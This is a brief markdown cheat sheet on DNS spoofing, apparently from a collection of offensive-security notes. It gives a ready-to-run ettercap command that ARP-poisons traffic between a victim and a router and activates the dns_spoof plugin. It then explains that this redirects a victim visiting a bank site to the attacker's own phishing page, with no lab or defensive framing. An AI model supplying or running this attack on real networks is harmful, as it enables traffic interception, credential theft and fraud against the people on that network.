# DNS Spoofing

DNS spoofing involves redirecting the victim’s traffic to a fake website instead of the intended one.

## Commands

#### 1) Spoof DNS requests

    ettercap -T -q -i wlan0mon -M arp:remote VICTIM_IP ROUTER_IP -P dns_spoof

You redirect a victim trying to visit www.bank.com (for example) to your own phishing page.
